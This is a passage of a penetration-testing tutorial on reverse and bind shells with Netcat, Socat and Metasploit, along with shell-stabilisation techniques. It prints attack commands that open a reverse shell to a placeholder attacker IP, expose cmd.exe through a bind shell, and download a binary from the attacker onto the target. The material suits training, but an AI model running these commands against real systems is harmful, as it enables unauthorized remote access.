# What the Shell? 
An introduction to sending and receiving (reverse/bind) shells when exploiting target machines.

## What is a shell?

A *shell* is what we use to interface with a Command Line environment. The common `bash` or `sh` programs in Linux, and `cmd.exe` and Powershell on Windows are all examples of a shell.

When targeting remote systems, it may be possible to force an application on the server to execute arbitrary code. We would then normally force the remote server to either send us command line access (this is a **reverse** shell), or to open up a port on the server which we can connect to to execute further commands (this is a **bind** shell).

## Tools

There are a variety of tools that we will use to receive reverse shells and to send bind shells. Generally, we need:

* malicious shell code, and
* a way to interface with the resulting shell.

We will discuss some of the tools below: 

-----

### Netcat

*Netcat* is an essential tool in networking. It is used to manually perform all kinds of network interactions. Most importantly, it can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system. Netcat shells are very unstable (easy to lose) by default, but can be improved by the use of certain techniques.

### Socat

*Socat* can be seen as an improved version of Netcat. It can do the same things as Netcat, and many more. Socat shells are usually also more stable than Netcat shells. However, there are some caveats:

1. Socat has more difficult syntax.
2. Netcat is installed on almost all Linux distributions by default, while Socat is not.

Both Netcat and Socat have `.exe` versions for use on Windows systems.

### Metasploit - multi/handler

The `auxiliary/multi/handler` module of the Metasploit framework can also be used to receive reverse shells. `multi/handler` provides a fully-fledged way to obtain stable shells, with many further options to improve the caught shell. It is also the only way to interact with a *meterpreter* shell, and is the easiest way to handle *staged payloads*.

### Msfvenom

Like `multi/handler`, msfvenom is part of the Metasploit framework. However, it is shipped as a standalone tool. Msfvenom is used to generate payloads, for both reverse and bind shells, on the fly.

-----

Aside from the tools above, there are also repositories which collate shells in different languages: 

* [Payload all the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
* [PentestMonkey Reverse Shell Cheatsheet](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [SecLists repo](https://github.com/danielmiessler/SecLists)

Kali Linux also comes pre-installed with a variety of webshells at `/usr/share/webshells`. 

## Types of shells

As mentioned earlier, there are two types of shells that are of interest when exploiting a target: *reverse* shells, and *bind* shells.

**Reverse shells** are when the target is forced to execute code that connects back to the attacker. The attacker would set-up a *listener* to receive the connection. Reverse shells are a good way to bypass firewall rules that may prevent us from connecting to arbitrary ports on the target. However, when we receive a shell from a target across the Internet, we will need to configure our own network to accept the shell. 

**Bind shells** are when the code excuted on the target starts a listener attached to a shell *on the target*. This would then be opened up to the Internet: we can connect to the port that the code has opened and obtain remote code execution. This has the advantage of net requiring configuration on our network, but may be prevented by firewalls protecting the target.

Generally, reverse shells are easier to learn and debug.

-----

### Reverse Shell Example

The reverse shell is more common. On the attacking machine, we might run a command such as:
```console
~$ sudo nc -lvnp 443
```
Meanwhile, on the target, we might execute a command such as: 
```console
~$ nc <LOCAL_IP> <PORT> -e /bin/bash
```
albeit not explicitly; usually executed via some code injection, etc.

Successful execution of the commands lead to something like

![Reverse Shell Example](./img/reverse_shell.png "Reverse Shell Example")

On the left, we have the reverse shell listener on the attacking machine. On the right, is the target machine. 

Notice that after running the command on the right, the listener receives a connection. When the `whoami` command is executed on the target, we see that we are executing commands as the target user.

> The main point here is that we are *listening* on our own attacking machine, and sending a connection *from* the target.

-----

### Bind Shell example

The bind shell is less common, but still very useful. On the target, we will need to start a listener, and at the same time tell it to execute `cmd.exe`:
```console
~$ nc -lvnp <PORT> -e "cmd.exe"
```
On the attacking machine, we will execute something like
```console
~$ nc <MACHINE_IP> <PORT>
```

We will end up with something that looks like

![Bind Shell example](./img/bind_shell.png "Bind Shell example")

Here, the attacker is on the left and the target is on the right. As we can see, we have code execution on the remote machine. 

> In constrast to reverse shells, here we are *listening* on the **target**, then connecting to it with the attacker.

-----

### Interactivity

Shells can either be *interactive* or *non-interactive*. 

* **Interactive**: *Powershell, Bash, Zsh* are all examples of interactive shells. These allow us to interact with the programs after executing them.
* **Non-interactive**: In a non-interactive shell, we are limited to programs which **do not** require user interation to run properly. Majority of reverse and bind shells are non-interactive.

## Netcat

As mentioned previously, Netcat is the basic tool in a pentester's toolkit when it comes to networking. For **reverse shells**, Netcat can be used to start a listener on the attacking machine.

The syntax for starting a listener in Linux is
```console
~$ nc -lvnp <PORT>
```
* `-l` tells Netcat that this is a listener
* `-v` requests for verbose output
* `-n` tells Netcat not to resolve hostnames or use DNS, i.e. only numeric-only IP addresses are valid
* `-p` indicates that a port will be specified

In the previous section, the example used port 443. Realistically, we can use any port we want (as long as no other service is using it). If a port below 1024 is used, then we will need `sudo` when starting the listener. 

> It is often a good idea to use a well-known port number (e.g. 80, 443, 53) as they are more likely to get past outbound firewall rules on the target.

On the other hand, for **bind shells**, we already have a listener on the target on a specified port -- all we need to do is connect to it. The syntax is straight forward:
```console
~$ nc <TARGET_IP> <PORT>
```

For more information, see the [man page](https://www.commandlinux.com/man-page/man1/nc.1.html) for Netcat.

## Shell stablisation

Shells obtained via Netcat are *unstable* by default -- `Ctrl + C` kills the entire shell.  The shells are also non-interactive, and often have strange formatting errors. This is because Netcat "shells" are essentially **processes running inside a terminal**, rather than being a terminal itself. 

Here, we will look at three techniques which can be used to stablise Netcat shells in Linux. Stabilisation of Windows reverse shells is significantly harder, but the [second technique](#technique-2-rlwrap) is particularly useful.

---

### Technique 1: Python

This technique is only applicatble to Linux systems, since they always have *Python* installed by default. This is a three-step process.

1. In the reverse shell, we execute

   ```console
   ~$ python -c 'import pty; pty.spawn("/bin/bash")'
   ```
   This is essentially running a Python script to spawn a better featured bash shell.

   > On some targets, we may need to specify the version of Python by using `python2` or `python3`.

   At this point, the shell will look better, but we still lack functionality like autocomplete, and `Ctrl + C` still kills the shell. 

2. In the shell that we spawned, we execute
   ```console
   ~$ export TERM=xterm
   ```

    This sets the environment variable `TERM` to be `xterm` which gives us access to terminal commands such as `clear`.

3. Finally, we will background the shell using `Ctrl + Z`, then run 
   ```console
   ~$ stty raw -echo; fg
   ```

   This command first turns off our own terminal echo -- giving us access to autocomplete, etc. -- and then foregrounds the spawned shell, thus completing the process.

Overall, the technique looks like 
![Shell Stablisation with Python](./img/python_stablisation.png "Shell Stablisation with Python")

Note that if the reverse shell is killed, any input in our own terminal will not be visible since we disabled the terminal echo (in the last step). To fix this, type `reset` and press `Enter`. 

-----

### Technique 2: rlwrap

*rlwrap* is a program which can give us access to the command history, autocomplete and other features **immediately** upon receiving the shell. However, some *manual* stabilisation must still be utilised to be able to use `Ctrl + C` inside the shell.

> rlwrap is **not** installed by default on Kali Linux, so we have to first install it with `sudo apt install rlwrap`.

To use rlwrap, we need to invoke a slightly different listener:
```console
~$ rlwrap nc -lvnp <PORT>
```

By prepending our Netcat listener with rlwrap, we obtain a more fully featured shell. This technique is also useful for Windows shells. 

On Linux targets, we can continue to fully stablise the shell using the third step of the previous technique: 
* background the reverse shell with `Ctrl + Z`,
* use `stty raw -echo; fg` to stablise and re-enter the shell.

-----

### Technique 3: Socat

The third way to stablise a shell is to use the initial Netcat shell as a stepping stone to a more fully-featured Socat shell. Like the [first technique](#technique-1-python), this is limited to Linux targets since a Socat shell is no more stable than a Netcat shell on Windows. 

To accomplish this stablisation, we first need to transfer a Socat static compiled binary (available on Github [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat); a statically compiled binary has no dependencies) to the target machine. 

One way to do this is to set up a webserver on the attacking machine inside the directory containing the Socat binary (possibly using Python: `sudo python3 -m http.server 80`). Then, on the target machine, using the netcat shell, download the file (typically via `curl` or `wget` on Linux, e.g. `wget <LOCAL_IP>/socat -O /tmp/socat`).

In a Windows CLI environment, the same can be done with Powershell, using either `Invoke-WebRequest` or a `webrequest` system class. 

Sending and receiving shells with Socat is covered in a later section.

-----

With the above techniques, it is useful to be able to change the terminal tty size. Typically, the shell does this automatically, but must be done manually for reverse/bind shells. In our own terminal, we execute
```console
~$ stty -a
speed 38400 baud; rows 45; columns 118; line = 0;
...
```
and note down the values for `rows` and `columns`. 

Then, in the reverse/bind shell, we execute

```console
~$ stty rows <ROWS>
~$ stty cols <COLUMNS>
```

This changes the registered height and width of the terminal so that programs -- text editors, etc. -- open and display correctly. 

## Socat